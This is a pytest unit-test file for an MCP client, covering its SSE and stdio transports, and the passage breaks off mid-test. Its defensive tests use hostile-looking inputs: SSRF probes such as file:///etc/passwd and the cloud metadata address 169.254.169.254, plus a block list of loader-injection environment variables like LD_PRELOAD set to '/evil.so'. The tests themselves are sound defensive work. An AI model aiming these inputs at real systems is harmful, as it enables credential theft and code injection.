"""
Unit tests for MCP (Model Context Protocol) client.

Tests both SSE and stdio transport modes with mocked dependencies.
Run with: pytest tests/unit/test_mcp.py -v
"""

import json
import os
import queue
import threading
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

# =============================================================================
# MCPClient (SSE Transport) Tests
# =============================================================================


@pytest.mark.unit
class TestMCPClientInitialization:
    """Test MCPClient initialization."""

    @pytest.fixture(autouse=True)
    def mock_httpx(self):
        """Mock httpx module for all tests."""
        mock_module = MagicMock()
        mock_module.Timeout = MagicMock(return_value=MagicMock())
        with patch.dict("sys.modules", {"httpx": mock_module}):
            yield mock_module

    def test_init_with_defaults(self, mock_httpx):
        """Test initialization with default values."""
        from eq_chatbot_core.mcp.client import MCPClient

        client = MCPClient(base_url="http://localhost:8000/sse")

        assert client.base_url == "http://localhost:8000/sse"
        assert client.timeout == 30.0
        assert client.api_key is None
        assert client._initialized is False
        assert client._message_endpoint is None

    def test_init_with_custom_timeout(self, mock_httpx):
        """Test initialization with custom timeout."""
        from eq_chatbot_core.mcp.client import MCPClient

        client = MCPClient(base_url="http://localhost:8000", timeout=60.0)

        assert client.timeout == 60.0

    def test_init_with_api_key(self, mock_httpx):
        """Test initialization with API key."""
        from eq_chatbot_core.mcp.client import MCPClient

        client = MCPClient(
            base_url="http://localhost:8000",
            api_key="test-api-key",
        )

        assert client.api_key == "test-api-key"

    def test_init_strips_trailing_slash(self, mock_httpx):
        """Test that trailing slash is stripped from base_url."""
        from eq_chatbot_core.mcp.client import MCPClient

        client = MCPClient(base_url="http://localhost:8000/sse/")

        assert client.base_url == "http://localhost:8000/sse"

    def test_get_headers_without_api_key(self, mock_httpx):
        """Test headers generation without API key."""
        from eq_chatbot_core.mcp.client import MCPClient

        client = MCPClient(base_url="http://localhost:8000")
        headers = client._get_headers()

        assert headers == {"Content-Type": "application/json"}

    def test_get_headers_with_api_key(self, mock_httpx):
        """Test headers generation with API key."""
        from eq_chatbot_core.mcp.client import MCPClient

        client = MCPClient(base_url="http://localhost:8000", api_key="secret")
        headers = client._get_headers()

        assert headers["Content-Type"] == "application/json"
        assert headers["Authorization"] == "Bearer secret"


@pytest.mark.unit
class TestMCPClientConnection:
    """Test MCPClient connection handling."""

    @pytest.fixture(autouse=True)
    def mock_httpx(self):
        """Mock httpx module."""
        mock_module = MagicMock()
        mock_module.Timeout = MagicMock(return_value=MagicMock())
        mock_module.ConnectError = Exception
        mock_module.TimeoutException = Exception
        with patch.dict("sys.modules", {"httpx": mock_module}):
            yield mock_module

    @pytest.fixture
    def client(self, mock_httpx):
        """Create MCPClient instance."""
        from eq_chatbot_core.mcp.client import MCPClient

        return MCPClient(base_url="http://localhost:8000/sse", timeout=1.0)

    def test_connect_not_connected_initially(self, client):
        """Test that client is not connected initially."""
        assert client._initialized is False
        assert client._message_endpoint is None

    def test_disconnect_clears_state(self, client, mock_httpx):
        """Test that disconnect clears client state."""
        # Setup mock client
        mock_http_client = MagicMock()
        client._client = mock_http_client
        client._initialized = True
        client._message_endpoint = "http://localhost:8000/message"
        client._sse_thread = MagicMock()
        client._sse_thread.join = MagicMock()
        client._sse_thread.is_alive = MagicMock(return_value=True)

        client.disconnect()

        assert client._initialized is False
        assert client._message_endpoint is None
        mock_http_client.close.assert_called_once()

    def test_close_calls_disconnect(self, client, mock_httpx):
        """Test that close() calls disconnect()."""
        with patch.object(client, "disconnect") as mock_disconnect:
            client.close()
            mock_disconnect.assert_called_once()


@pytest.mark.unit
class TestMCPClientSSEEventHandling:
    """Test MCPClient SSE event handling."""

    @pytest.fixture(autouse=True)
    def mock_httpx(self):
        """Mock httpx module."""
        mock_module = MagicMock()
        mock_module.Timeout = MagicMock(return_value=MagicMock())
        with patch.dict("sys.modules", {"httpx": mock_module}):
            yield mock_module

    @pytest.fixture
    def client(self, mock_httpx):
        """Create MCPClient instance."""
        from eq_chatbot_core.mcp.client import MCPClient

        return MCPClient(base_url="http://localhost:8000/sse")

    def test_handle_endpoint_event_absolute_url(self, client):
        """Test handling endpoint event with absolute URL."""
        client._handle_sse_event("endpoint", "http://localhost:8000/message")

        assert client._message_endpoint == "http://localhost:8000/message"
        assert client._connected.is_set()

    def test_handle_endpoint_event_relative_url(self, client):
        """Test handling endpoint event with relative URL."""
        client._handle_sse_event("endpoint", "/message")

        assert client._message_endpoint == "http://localhost:8000/message"
        assert client._connected.is_set()

    def test_handle_message_event(self, client):
        """Test handling message event puts response in queue."""
        # Setup pending request
        response_queue = queue.Queue()
        client._pending_requests[1] = response_queue

        response_data = json.dumps({"jsonrpc": "2.0", "id": 1, "result": {"tools": []}})
        client._handle_sse_event("message", response_data)

        # Verify response was put in queue
        result = response_queue.get_nowait()
        assert result["id"] == 1
        assert "result" in result

    def test_handle_message_event_unknown_request_id(self, client):
        """Test handling message event for unknown request ID."""
        # No pending request for ID 999
        response_data = json.dumps({"jsonrpc": "2.0", "id": 999, "result": {}})

        # Should not raise, just log warning
        client._handle_sse_event("message", response_data)

    def test_handle_message_event_invalid_json(self, client):
        """Test handling message event with invalid JSON."""
        # Should not raise, just log error
        client._handle_sse_event("message", "not valid json")

    def test_handle_endpoint_event_rejects_private_ip(self, client):
        """SSRF protection: reject endpoint URLs that target private networks."""
        # A hostile MCP server tries to redirect POST traffic to an internal address.
        client._handle_sse_event("endpoint", "http://10.0.0.5/internal")

        assert client._message_endpoint is None
        assert not client._connected.is_set()

    def test_handle_endpoint_event_rejects_non_http_scheme(self, client):
        """SSRF protection: reject endpoint URLs with non-HTTP(S) schemes."""
        client._handle_sse_event("endpoint", "file:///etc/passwd")

        assert client._message_endpoint is None
        assert not client._connected.is_set()


@pytest.mark.unit
class TestMCPClientRequests:
    """Test MCPClient request handling."""

    @pytest.fixture(autouse=True)
    def mock_httpx(self):
        """Mock httpx module."""
        mock_module = MagicMock()
        mock_module.Timeout = MagicMock(return_value=MagicMock())
        with patch.dict("sys.modules", {"httpx": mock_module}):
            yield mock_module

    @pytest.fixture
    def client(self, mock_httpx):
        """Create MCPClient instance."""
        from eq_chatbot_core.mcp.client import MCPClient

        return MCPClient(base_url="http://localhost:8000/sse", timeout=1.0)

    def test_send_request_not_connected(self, client):
        """Test send_request raises when not connected."""
        with pytest.raises(RuntimeError, match="Not connected"):
            client._send_request("tools/list")

    def test_send_request_success(self, client, mock_httpx):
        """Test successful request/response cycle."""
        # Setup: connected client with mocked HTTP client
        client._message_endpoint = "http://localhost:8000/message"
        mock_http_client = MagicMock()
        mock_response = MagicMock()
        mock_response.status_code = 200
        mock_http_client.post.return_value = mock_response
        client._client = mock_http_client

        # Simulate SSE response in background
        def simulate_sse_response():
            import time

            time.sleep(0.05)
            response_data = json.dumps({"jsonrpc": "2.0", "id": 1, "result": {"tools": []}})
            client._handle_sse_event("message", response_data)

        thread = threading.Thread(target=simulate_sse_response)
        thread.start()

        result = client._send_request("tools/list")
        thread.join()

        assert result == {"tools": []}
        mock_http_client.post.assert_called_once()

    def test_send_request_timeout(self, client, mock_httpx):
        """Test request timeout."""
        client._message_endpoint = "http://localhost:8000/message"
        mock_http_client = MagicMock()
        mock_response = MagicMock()
        mock_response.status_code = 200
        mock_http_client.post.return_value = mock_response
        client._client = mock_http_client

        # No SSE response will come, should timeout
        with pytest.raises(TimeoutError, match="timed out"):
            client._send_request("tools/list")

    def test_send_request_http_error(self, client, mock_httpx):
        """Test request with HTTP error response."""
        client._message_endpoint = "http://localhost:8000/message"
        mock_http_client = MagicMock()
        mock_response = MagicMock()
        mock_response.status_code = 500
        mock_response.text = "Server Error"
        mock_http_client.post.return_value = mock_response
        client._client = mock_http_client

        with pytest.raises(RuntimeError, match="HTTP 500"):
            client._send_request("tools/list")

    def test_send_request_increments_id(self, client, mock_httpx):
        """Test that request IDs are incremented."""
        client._message_endpoint = "http://localhost:8000/message"
        mock_http_client = MagicMock()
        mock_response = MagicMock()
        mock_response.status_code = 200
        mock_http_client.post.return_value = mock_response
        client._client = mock_http_client

        assert client._request_id == 0

        # Simulate response for first request
        def simulate_response_1():
            import time

            time.sleep(0.05)
            client._handle_sse_event("message", json.dumps({"jsonrpc": "2.0", "id": 1, "result": {}}))

        thread = threading.Thread(target=simulate_response_1)
        thread.start()
        client._send_request("test1")
        thread.join()

        assert client._request_id == 1


@pytest.mark.unit
class TestMCPClientToolOperations:
    """Test MCPClient tool operations."""

    @pytest.fixture(autouse=True)
    def mock_httpx(self):
        """Mock httpx module."""
        mock_module = MagicMock()
        mock_module.Timeout = MagicMock(return_value=MagicMock())
        with patch.dict("sys.modules", {"httpx": mock_module}):
            yield mock_module

    @pytest.fixture
    def connected_client(self, mock_httpx):
        """Create connected MCPClient instance."""
        from eq_chatbot_core.mcp.client import MCPClient

        client = MCPClient(base_url="http://localhost:8000/sse", timeout=1.0)
        client._initialized = True
        client._message_endpoint = "http://localhost:8000/message"

        # Setup mock HTTP client
        mock_http_client = MagicMock()
        mock_response = MagicMock()
        mock_response.status_code = 200
        mock_http_client.post.return_value = mock_response
        client._client = mock_http_client

        return client

    def test_list_tools_success(self, connected_client):
        """Test list_tools returns tool list."""
        expected_tools = [
            {"name": "get_weather", "description": "Get weather"},
            {"name": "search", "description": "Search"},
        ]

        def simulate_response():
            import time

            time.sleep(0.05)
            response = {"jsonrpc": "2.0", "id": 1, "result": {"tools": expected_tools}}
            connected_client._handle_sse_event("message", json.dumps(response))

        thread = threading.Thread(target=simulate_response)
        thread.start()

        tools = connected_client.list_tools()
        thread.join()

        assert tools == expected_tools

    def test_list_tools_empty(self, connected_client):
        """Test list_tools returns empty list when no tools."""

        def simulate_response():
            import time

            time.sleep(0.05)
            response = {"jsonrpc": "2.0", "id": 1, "result": {"tools": []}}
            connected_client._handle_sse_event("message", json.dumps(response))

        thread = threading.Thread(target=simulate_response)
        thread.start()

        tools = connected_client.list_tools()
        thread.join()

        assert tools == []

    def test_call_tool_success(self, connected_client):
        """Test call_tool returns MCPToolResult."""
        from eq_chatbot_core.mcp.client import MCPToolResult

        def simulate_response():
            import time

            time.sleep(0.05)
            response = {
                "jsonrpc": "2.0",
                "id": 1,
                "result": {"content": [{"type": "text", "text": "Weather: Sunny, 25°C"}]},
            }
            connected_client._handle_sse_event("message", json.dumps(response))

        thread = threading.Thread(target=simulate_response)
        thread.start()

        result = connected_client.call_tool("get_weather", {"location": "Berlin"})
        thread.join()

        assert isinstance(result, MCPToolResult)
        assert result.success is True
        assert "Sunny" in result.content
        assert result.execution_time_ms > 0

    def test_call_tool_error(self, connected_client):
        """Test call_tool handles errors."""

        def simulate_response():
            import time

            time.sleep(0.05)
            response = {"jsonrpc": "2.0", "id": 1, "error": {"code": -32000, "message": "Tool not found"}}
            connected_client._handle_sse_event("message", json.dumps(response))

        thread = threading.Thread(target=simulate_response)
        thread.start()

        result = connected_client.call_tool("unknown_tool", {})
        thread.join()

        assert result.success is False
        assert result.error is not None
        assert "Tool not found" in result.error

    def test_get_tool_schema_found(self, connected_client):
        """Test get_tool_schema returns schema when found."""
        tools = [
            {"name": "get_weather", "description": "Get weather", "inputSchema": {"type": "object"}},
        ]

        def simulate_response():
            import time

            time.sleep(0.05)
            response = {"jsonrpc": "2.0", "id": 1, "result": {"tools": tools}}
            connected_client._handle_sse_event("message", json.dumps(response))

        thread = threading.Thread(target=simulate_response)
        thread.start()

        schema = connected_client.get_tool_schema("get_weather")
        thread.join()

        assert schema is not None
        assert schema["name"] == "get_weather"

    def test_get_tool_schema_not_found(self, connected_client):
        """Test get_tool_schema returns None when not found."""

        def simulate_response():
            import time

            time.sleep(0.05)
            response = {"jsonrpc": "2.0", "id": 1, "result": {"tools": []}}
            connected_client._handle_sse_event("message", json.dumps(response))

        thread = threading.Thread(target=simulate_response)
        thread.start()

        schema = connected_client.get_tool_schema("unknown_tool")
        thread.join()

        assert schema is None

    def test_call_tool_extracts_text_content(self, connected_client):
        """Test call_tool extracts text from content array."""

        def simulate_response():
            import time

            time.sleep(0.05)
            response = {
                "jsonrpc": "2.0",
                "id": 1,
                "result": {
                    "content": [
                        {"type": "text", "text": "Line 1"},
                        {"type": "text", "text": "Line 2"},
                    ]
                },
            }
            connected_client._handle_sse_event("message", json.dumps(response))

        thread = threading.Thread(target=simulate_response)
        thread.start()

        result = connected_client.call_tool("test_tool", {})
        thread.join()

        assert result.success is True
        assert "Line 1" in result.content
        assert "Line 2" in result.content


@pytest.mark.unit
class TestMCPClientContextManager:
    """Test MCPClient context manager."""

    @pytest.fixture(autouse=True)
    def mock_httpx(self):
        """Mock httpx module."""
        mock_module = MagicMock()
        mock_module.Timeout = MagicMock(return_value=MagicMock())
        with patch.dict("sys.modules", {"httpx": mock_module}):
            yield mock_module

    def test_context_manager_enter_exit(self, mock_httpx):
        """Test context manager calls connect and close."""
        from eq_chatbot_core.mcp.client import MCPClient

        client = MCPClient(base_url="http://localhost:8000/sse")

        with patch.object(client, "connect") as mock_connect, patch.object(client, "close") as mock_close:
            with client:
                mock_connect.assert_called_once()

            mock_close.assert_called_once()

    def test_context_manager_exception_cleanup(self, mock_httpx):
        """Test context manager cleans up on exception."""
        from eq_chatbot_core.mcp.client import MCPClient

        client = MCPClient(base_url="http://localhost:8000/sse")

        with patch.object(client, "connect"), patch.object(client, "close") as mock_close:
            with pytest.raises(ValueError):
                with client:
                    raise ValueError("Test error")

            mock_close.assert_called_once()


# =============================================================================
# StdioMCPClient Tests
# =============================================================================


@pytest.mark.unit
class TestStdioMCPClientInitialization:
    """Test StdioMCPClient initialization."""

    def test_init_with_defaults(self):
        """Test initialization with default values."""
        from eq_chatbot_core.mcp.client import StdioMCPClient

        client = StdioMCPClient(command="python")

        assert client.command == "python"
        assert client.args == []
        assert client.env == {}
        assert client.timeout == 30.0
        assert client._process is None

    def test_init_with_args(self):
        """Test initialization with command arguments."""
        from eq_chatbot_core.mcp.client import StdioMCPClient

        client = StdioMCPClient(
            command="python",
            args=["-m", "mcp_server"],
        )

        assert client.args == ["-m", "mcp_server"]

    def test_init_with_env(self):
        """Test initialization with environment variables."""
        from eq_chatbot_core.mcp.client import StdioMCPClient

        client = StdioMCPClient(
            command="python",
            env={"API_KEY": "secret"},
        )

        assert client.env == {"API_KEY": "secret"}

    def test_init_with_custom_timeout(self):
        """Test initialization with custom timeout."""
        from eq_chatbot_core.mcp.client import StdioMCPClient

        client = StdioMCPClient(command="python", timeout=60.0)

        assert client.timeout == 60.0

    @pytest.mark.parametrize(
        "dangerous_key",
        ["LD_PRELOAD", "DYLD_INSERT_LIBRARIES", "PYTHONSTARTUP", "ld_preload", "BASH_ENV"],
    )
    def test_init_rejects_code_injection_env(self, dangerous_key):
        """Caller-supplied loader/startup-hook env vars are refused."""
        from eq_chatbot_core.mcp.client import StdioMCPClient

        with pytest.raises(ValueError, match="not allowed"):
            StdioMCPClient(command="python", env={dangerous_key: "/evil.so"})

    def test_init_allows_pythonpath_env(self):
        """PYTHONPATH stays the documented escape hatch for custom module paths."""
        from eq_chatbot_core.mcp.client import StdioMCPClient

        client = StdioMCPClient(command="python", env={"PYTHONPATH": "/opt/app"})
        assert client.env == {"PYTHONPATH": "/opt/app"}


@pytest.mark.unit
class TestStdioMCPClientProcessManagement:
    """Test StdioMCPClient process management."""

    @pytest.fixture
    def client(self):
        """Create StdioMCPClient instance."""
        from eq_chatbot_core.mcp.client import StdioMCPClient

        return StdioMCPClient(
            command="python",
            args=["-m", "mcp_server"],
            timeout=1.0,
        )

    @pytest.mark.asyncio
    async def test_start_creates_subprocess(self, client):
        """Test start() creates subprocess."""
        mock_process = MagicMock()
        mock_process.stdin = MagicMock()
        mock_process.stdin.write = MagicMock()
        mock_process.stdin.drain = AsyncMock()
        mock_process.stdout = MagicMock()
        mock_process.stdout.readline = AsyncMock(return_value=b'{"jsonrpc": "2.0", "id": 1, "result": {}}\n')

        with patch("asyncio.create_subprocess_exec", new_callable=AsyncMock) as mock_exec:
            mock_exec.return_value = mock_process

            await client.start()

            mock_exec.assert_called_once()
            assert client._process is mock_process

    @pytest.mark.asyncio
    async def test_start_already_started(self, client):
        """Test start() does nothing if already started."""
        client._process = MagicMock()

        with patch("asyncio.create_subprocess_exec", new_callable=AsyncMock) as mock_exec:
            await client.start()
            mock_exec.assert_not_called()

    @pytest.mark.asyncio
    async def test_start_does_not_leak_secrets_to_subprocess(self, client):
        """Subprocess env must not inherit caller's API keys / secrets.
        Only an explicit whitelist plus self.env is forwarded."""
        mock_process = MagicMock()
        mock_process.stdin = MagicMock()
        mock_process.stdin.write = MagicMock()
        mock_process.stdin.drain = AsyncMock()
        mock_process.stdout = MagicMock()
        mock_process.stdout.readline = AsyncMock(return_value=b'{"jsonrpc": "2.0", "id": 1, "result": {}}\n')

        # Explicitly set a "secret" in os.environ that the subprocess should NOT see.
        secret_key = "EQCB_TEST_SECRET_DO_NOT_LEAK"
        with patch.dict(os.environ, {secret_key: "sk-secret-leak", "PATH": "/usr/bin"}, clear=False):
            with patch("asyncio.create_subprocess_exec", new_callable=AsyncMock) as mock_exec:
                mock_exec.return_value = mock_process
                client.env = {"MCP_TOKEN": "explicit-value"}

                await client.start()

                _, kwargs = mock_exec.call_args
                forwarded_env = kwargs["env"]
                assert secret_key not in forwarded_env, "subprocess must not inherit caller secrets"
                assert forwarded_env.get("MCP_TOKEN") == "explicit-value"
                assert "PATH" in forwarded_env  # whitelisted

    @pytest.mark.asyncio
    async def test_stop_terminates_process(self, client):
        """Test stop() terminates subprocess."""
        mock_process = MagicMock()
        mock_process.terminate = MagicMock()
        mock_process.wait = AsyncMock()
        client._process = mock_process

        await client.stop()

        mock_process.terminate.assert_called_once()
        assert client._process is None

    @pytest.mark.asyncio
    async def test_stop_kills_on_timeout(self, client):
        """Test stop() kills process if terminate times out."""
        mock_process = MagicMock()
        mock_process.terminate = MagicMock()
        mock_process.kill = MagicMock()
        mock_process.wait = AsyncMock(side_effect=[TimeoutError(), None])
        client._process = mock_process

        await client.stop()

        mock_process.terminate.assert_called_once()
        mock_process.kill.assert_called_once()

    @pytest.mark.asyncio
    async def test_stop_not_started(self, client):
        """Test stop() does nothing if not started."""
        await client.stop()
        # Should not raise


@pytest.mark.unit
class TestStdioMCPClientRequests:
    """Test StdioMCPClient request handling."""

    @pytest.fixture
    def client(self):
        """Create StdioMCPClient instance."""
        from eq_chatbot_core.mcp.client import StdioMCPClient

        return StdioMCPClient(command="python", timeout=1.0)

    @pytest.mark.asyncio
    async def test_send_request_not_started(self, client):
        """Test _send_request raises when not started."""
        with pytest.raises(RuntimeError, match="not started"):
            await client._send_request("tools/list")

    @pytest.mark.asyncio
    async def test_send_request_success(self, client):
        """Test successful request/response."""
        mock_process = MagicMock()
        mock_process.stdin = MagicMock()
        mock_process.stdin.write = MagicMock()
        mock_process.stdin.drain = AsyncMock()
        mock_process.stdout = MagicMock()
        mock_process.stdout.readline = AsyncMock(return_value=b'{"jsonrpc": "2.0", "id": 1, "result": {"tools": []}}\n')
        client._process = mock_process

        result = await client._send_request("tools/list")

        assert result == {"tools": []}

    @pytest.mark.asyncio
    async def test_send_request_timeout(self, client):
        """Test request timeout."""
        mock_process = MagicMock()
        mock_process.stdin = MagicMock()
        mock_process.stdin.write = MagicMock()
        mock_process.stdin.drain = AsyncMock()
        mock_process.stdout = MagicMock()
        mock_process.stdout.readline = AsyncMock(side_effect=TimeoutError())
        client._process = mock_process

        with pytest.raises(TimeoutError, match="timed out"):
            await client._send_request("tools/list")

    @pytest.mark.asyncio
    async def test_send_request_error_response(self, client):
        """Test request with error response."""
        mock_process = MagicMock()
        mock_process.stdin = MagicMock()
        mock_process.stdin.write = MagicMock()
        mock_process.stdin.drain = AsyncMock()
        mock_process.stdout = MagicMock()
        mock_process.stdout.readline = AsyncMock(
            return_value=b'{"jsonrpc": "2.0", "id": 1, "error": {"message": "Not found"}}\n'
        )
        client._process = mock_process

        with pytest.raises(RuntimeError, match="Not found"):
            await client._send_request("tools/list")

    @pytest.mark.asyncio
    async def test_send_request_process_closed(self, client):
        """Test request when process closes unexpectedly."""
        mock_process = MagicMock()
        mock_process.stdin = MagicMock()
        mock_process.stdin.write = MagicMock()
        mock_process.stdin.drain = AsyncMock()
        mock_process.stdout = MagicMock()
        mock_process.stdout.readline = AsyncMock(return_value=b"")
        client._process = mock_process

        with pytest.raises(RuntimeError, match="closed unexpectedly"):
            await client._send_request("tools/list")


@pytest.mark.unit
class TestStdioMCPClientToolOperations:
    """Test StdioMCPClient tool operations."""

    @pytest.fixture
    def started_client(self):
        """Create started StdioMCPClient instance."""
        from eq_chatbot_core.mcp.client import StdioMCPClient

        client = StdioMCPClient(command="python", timeout=1.0)

        mock_process = MagicMock()
        mock_process.stdin = MagicMock()
        mock_process.stdin.write = MagicMock()
        mock_process.stdin.drain = AsyncMock()
        mock_process.stdout = MagicMock()
        client._process = mock_process

        return client

    @pytest.mark.asyncio
    async def test_list_tools_async(self, started_client):
        """Test list_tools_async returns tool list."""
        expected_tools = [{"name": "tool1"}, {"name": "tool2"}]
        started_client._process.stdout.readline = AsyncMock(
            return_value=json.dumps({"jsonrpc": "2.0", "id": 1, "result": {"tools": expected_tools}}).encode() + b"\n"
        )

        tools = await started_client.list_tools_async()

        assert tools == expected_tools

    @pytest.mark.asyncio
    async def test_call_tool_async_success(self, started_client):
        """Test call_tool_async returns MCPToolResult."""
        from eq_chatbot_core.mcp.client import MCPToolResult

        started_client._process.stdout.readline = AsyncMock(
            return_value=json.dumps(
                {"jsonrpc": "2.0", "id": 1, "result": {"content": [{"type": "text", "text": "Result data"}]}}
            ).encode()
            + b"\n"
        )

        result = await started_client.call_tool_async("my_tool", {"arg": "value"})

        assert isinstance(result, MCPToolResult)
        assert result.success is True
        assert "Result data" in result.content

    @pytest.mark.asyncio
    async def test_call_tool_async_error(self, started_client):
        """Test call_tool_async handles errors."""
        started_client._process.stdout.readline = AsyncMock(side_effect=Exception("Connection lost"))

        result = await started_client.call_tool_async("my_tool", {})

        assert result.success is False
        assert "Connection lost" in result.error

    @pytest.mark.asyncio
    async def test_list_tools_async_error(self, started_client):
        """Test list_tools_async handles errors gracefully."""
        started_client._process.stdout.readline = AsyncMock(side_effect=Exception("Connection error"))

        tools = await started_client.list_tools_async()

        assert tools == []


@pytest.mark.unit
class TestStdioMCPClientContextManager:
    """Test StdioMCPClient context manager."""

    @pytest.mark.asyncio
    async def test_async_context_manager(self):
        """Test async context manager."""
        from eq_chatbot_core.mcp.client import StdioMCPClient

        client = StdioMCPClient(command="python")

        with (
            patch.object(client, "start", new_callable=AsyncMock) as mock_start,
            patch.object(client, "stop", new_callable=AsyncMock) as mock_stop,
        ):
            async with client:
                mock_start.assert_called_once()

            mock_stop.assert_called_once()

    def test_sync_context_manager(self):
        """Test sync context manager."""
        from eq_chatbot_core.mcp.client import StdioMCPClient

        client = StdioMCPClient(command="python")

        # Need to set _process to a mock value so close() actually calls stop()
        # close() has guard: if self._process is not None:
        mock_process = MagicMock()
        mock_process.returncode = None

        with (
            patch.object(client, "start", new_callable=AsyncMock) as mock_start_fn,
            patch.object(client, "stop", new_callable=AsyncMock) as mock_stop_fn,
        ):
            # Simulate that start() sets _process
            def set_process():
                client._process = mock_process

            mock_start_fn.side_effect = set_process

            with client:
                pass

            mock_start_fn.assert_called_once()
            mock_stop_fn.assert_called_once()


# =============================================================================
# Factory Function Tests
# =============================================================================


@pytest.mark.unit
class TestGetMCPClient:
    """Test get_mcp_client factory function."""

    @pytest.fixture(autouse=True)
    def mock_httpx(self):
        """Mock httpx module."""
        mock_module = MagicMock()
        mock_module.Timeout = MagicMock(return_value=MagicMock())
        with patch.dict("sys.modules", {"httpx": mock_module}):
            yield mock_module

    def test_get_mcp_client_sse(self, mock_httpx):
        """Test creating SSE client."""
        from eq_chatbot_core.mcp import MCPClient, get_mcp_client

        client = get_mcp_client(
            transport="sse",
            url="http://localhost:8000/sse",
            api_key="test-key",
        )

        assert isinstance(client, MCPClient)
        assert client.base_url == "http://localhost:8000/sse"
        assert client.api_key == "test-key"

    def test_get_mcp_client_stdio(self, mock_httpx):
        """Test creating stdio client."""
        from eq_chatbot_core.mcp import StdioMCPClient, get_mcp_client

        client = get_mcp_client(
            transport="stdio",
            command="python",
            args=["-m", "mcp_server"],
            env={"KEY": "value"},
        )

        assert isinstance(client, StdioMCPClient)
        assert client.command == "python"
        assert client.args == ["-m", "mcp_server"]
        assert client.env == {"KEY": "value"}

    def test_get_mcp_client_invalid_transport(self, mock_httpx):
        """Test invalid transport raises ValueError."""
        from eq_chatbot_core.mcp import get_mcp_client

        with pytest.raises(ValueError, match="Unknown transport"):
            get_mcp_client(transport="invalid")

    def test_get_mcp_client_missing_url(self, mock_httpx):
        """Test SSE transport without URL raises ValueError."""
        from eq_chatbot_core.mcp import get_mcp_client

        with pytest.raises(ValueError, match="url is required"):
            get_mcp_client(transport="sse")

    def test_get_mcp_client_missing_command(self, mock_httpx):
        """Test stdio transport without command raises ValueError."""
        from eq_chatbot_core.mcp import get_mcp_client

        with pytest.raises(ValueError, match="command is required"):
            get_mcp_client(transport="stdio")

    def test_get_mcp_client_with_timeout(self, mock_httpx):
        """Test creating client with custom timeout."""
        from eq_chatbot_core.mcp import get_mcp_client

        client = get_mcp_client(
            transport="sse",
            url="http://localhost:8000",
            timeout=60.0,
        )

        assert client.timeout == 60.0


# =============================================================================
# MCPToolResult Tests
# =============================================================================


@pytest.mark.unit
class TestMCPToolResult:
    """Test MCPToolResult dataclass."""

    def test_tool_result_success(self):
        """Test successful tool result."""
        from eq_chatbot_core.mcp.client import MCPToolResult

        result = MCPToolResult(
            success=True,
            content="Result content",
            execution_time_ms=123.45,
        )

        assert result.success is True
        assert result.content == "Result content"
        assert result.error is None
        assert result.execution_time_ms == 123.45

    def test_tool_result_failure(self):
        """Test failed tool result."""
        from eq_chatbot_core.mcp.client import MCPToolResult

        result = MCPToolResult(
            success=False,
            content=None,
            error="Tool execution failed",
            execution_time_ms=50.0,
        )

        assert result.success is False
        assert result.content is None
        assert result.error == "Tool execution failed"

    def test_tool_result_defaults(self):
        """Test MCPToolResult default values."""
        from eq_chatbot_core.mcp.client import MCPToolResult

        result = MCPToolResult(
            success=True,
            content="data",
            execution_time_ms=10.0,
        )

        assert result.error is None  # Default value


# =============================================================================
# Version Integration Test
# =============================================================================


@pytest.mark.unit
class TestMCPClientVersion:
    """Test that MCP client uses correct version."""

    @pytest.fixture(autouse=True)
    def mock_httpx(self):
        """Mock httpx module."""
        mock_module = MagicMock()
        mock_module.Timeout = MagicMock(return_value=MagicMock())
        with patch.dict("sys.modules", {"httpx": mock_module}):
            yield mock_module

    def test_client_uses_package_version(self, mock_httpx):
        """Test that __version__ is a non-empty PEP 440 string."""
        import re

        from eq_chatbot_core.version import __version__

        # Don't pin a specific version here — that drifts on every release.
        # Just verify the string exists and looks like a version.
        assert __version__
        assert re.match(r"^\d+\.\d+\.\d+", __version__), f"Unexpected version format: {__version__}"


# =============================================================================
# URL Validation Tests (SSRF Protection)
# =============================================================================


@pytest.mark.unit
class TestURLValidation:
    """Test _validate_url for SSRF protection."""

    @pytest.fixture(autouse=True)
    def mock_httpx(self):
        """Mock httpx module."""
        mock_module = MagicMock()
        mock_module.Timeout = MagicMock(return_value=MagicMock())
        with patch.dict("sys.modules", {"httpx": mock_module}):
            yield mock_module

    def test_valid_http_url(self, mock_httpx):
        """Test that http URLs are accepted."""
        from eq_chatbot_core.mcp.client import _validate_url

        # Should not raise for localhost
        _validate_url("http://localhost:8000")

    def test_valid_https_url(self, mock_httpx):
        """Test that https URLs resolving to a public IP are accepted."""
        import socket

        from eq_chatbot_core.mcp.client import _validate_url

        # Pin DNS to a public IP so the test is deterministic and offline-safe;
        # mcp.example.com (RFC 2606) does not resolve in CI/sandbox.
        public_addrinfo = [(2, 1, 6, "", ("93.184.216.34", 0))]
        with patch.object(socket, "getaddrinfo", return_value=public_addrinfo):
            ips = _validate_url("https://mcp.example.com")
        assert ips == frozenset({"93.184.216.34"})

    def test_invalid_scheme_ftp(self, mock_httpx):
        """Test that ftp scheme is rejected."""
        from eq_chatbot_core.mcp.client import _validate_url

        with pytest.raises(ValueError, match="not allowed"):
            _validate_url("ftp://example.com/data")

    def test_invalid_scheme_file(self, mock_httpx):
        """Test that file scheme is rejected."""
        from eq_chatbot_core.mcp.client import _validate_url

        with pytest.raises(ValueError, match="not allowed"):
            _validate_url("file:///etc/passwd")

    def test_empty_hostname_rejected(self, mock_httpx):
        """Test that URLs without hostname are rejected."""
        from eq_chatbot_core.mcp.client import _validate_url

        with pytest.raises(ValueError, match="valid hostname"):
            _validate_url("http://")

    def test_localhost_127_allowed(self, mock_httpx):
        """Test that 127.0.0.1 is explicitly allowed."""
        from eq_chatbot_core.mcp.client import _validate_url

        _validate_url("http://127.0.0.1:8000")

    def test_private_ip_blocked(self, mock_httpx):
        """Test that private IP ranges (10.x.x.x) are blocked."""
        from eq_chatbot_core.mcp.client import _validate_url

        with pytest.raises(ValueError, match="private/reserved"):
            _validate_url("http://10.0.0.1:8000")

    def test_link_local_blocked(self, mock_httpx):
        """Test that link-local addresses (169.254.x.x) are blocked."""
        from eq_chatbot_core.mcp.client import _validate_url

        with pytest.raises(ValueError, match="private/reserved"):
            _validate_url("http://169.254.169.254/latest/meta-data/")

    def test_mcpclient_validates_url(self, mock_httpx):
        """Test that MCPClient validates URL on init."""
        from eq_chatbot_core.mcp.client import MCPClient

        with pytest.raises(ValueError, match="not allowed"):
            MCPClient(base_url="ftp://bad-scheme.example.com")


# =============================================================================
# Stdio Command Validation Tests
# =============================================================================


@pytest.mark.unit
class TestStdioCommandValidation:
    """Test _validate_stdio_command for command whitelist enforcement."""

    def test_allowed_command_python(self):
        """Test that python is in the whitelist."""
        from eq_chatbot_core.mcp.client import _validate_stdio_command

